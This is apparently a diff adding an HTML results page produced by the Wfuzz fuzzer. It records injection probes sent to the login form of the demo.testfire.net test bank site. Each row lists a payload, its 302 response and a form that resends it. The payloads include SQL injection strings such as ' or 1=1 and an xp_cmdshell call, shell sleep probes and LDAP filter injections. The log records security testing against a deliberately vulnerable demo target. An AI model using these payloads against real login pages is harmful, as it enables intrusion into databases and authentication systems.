+<tr><td>00083</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>t'exec master..xp_cmdshell 'nslookup www.google.com'--</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="t'exec master..xp_cmdshell 'nslookup www.google.com'--"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00087</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>' UNION ALL SELECT</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="' UNION ALL SELECT"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00088</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>' or (EXISTS)</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="' or (EXISTS)"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00085</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>\x27UNION SELECT</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="\x27UNION SELECT"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00086</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>' UNION SELECT</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="' UNION SELECT"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00089</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>' (select top 1</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="' (select top 1"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00090</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>'||UTL_HTTP.REQUEST</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="'||UTL_HTTP.REQUEST"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00091</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>1;SELECT%20*</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="1;SELECT%20*"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00092</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>to_timestamp_tz</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="to_timestamp_tz"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00093</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>tz_offset</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="tz_offset"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00094</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>&lt;&gt;&quot;'%;)(&amp;+</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value=""><input type="hidden" name="lt;" value="None"><input type="hidden" name="gt;" value="None"><input type="hidden" name="quot;'%;)(" value="None"><input type="hidden" name="amp;+" value="None"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00097</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%20$(sleep%2050)</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="%20$(sleep%2050)"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00098</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%20'sleep%2050'</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="%20'sleep%2050'"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00099</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>char%4039%41%2b%40SELECT</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="char%4039%41%2b%40SELECT"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00100</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>&apos;%20OR</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value=""><input type="hidden" name="apos;%20OR" value="None"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00095</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>'%20or%201=1</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="'%20or%201=1"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00096</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%27%20or%201=1</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="%27%20or%201=1"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00101</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>'sqlattempt1</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="'sqlattempt1"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00102</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>(sqlattempt2)</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="(sqlattempt2)"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00103</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>|</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="|"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00104</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%7C</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="%7C"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00111</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>(</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="("><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00112</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%28</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="%28"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00106</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%2A%7C</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="%2A%7C"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00108</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%2A%28%7C%28mail%3D%2A%29%29</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="%2A%28%7C%28mail%3D%2A%29%29"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00105</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>*|</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="*|"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00107</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>*(|(mail=*))</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="*(|(mail=*))"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00109</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>*(|(objectclass=*))</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="*(|(objectclass=*))"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00110</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%2A%28%7C%28objectclass%3D%2A%29%29</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="%2A%28%7C%28objectclass%3D%2A%29%29"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00113</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>)</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value=")"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00114</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%29</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="%29"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00116</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%26</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="%26"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00115</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>&</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value=""><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00117</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>!</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="!"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00118</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%21</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="%21"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00122</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>/</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="/"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00119</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>' or 1=1 or ''='</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="' or 1=1 or ''='"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00120</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>' or ''='</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="' or ''='"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00121</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>x' or 1=1 or 'x'='y</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="x' or 1=1 or 'x'='y"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00124</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>//*</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="//*"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00123</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>//</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="//"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00125</td>
+<td><font color=#8888FF>302</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>*/*</td><td><form method="post" action="http://demo.testfire.net/bank/login.jsp"><input type="hidden" name="uid" value="*/*"><input type="hidden" name="passw" value="test"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+</table></body></html><h5>Wfuzz by EdgeSecurity<h5>
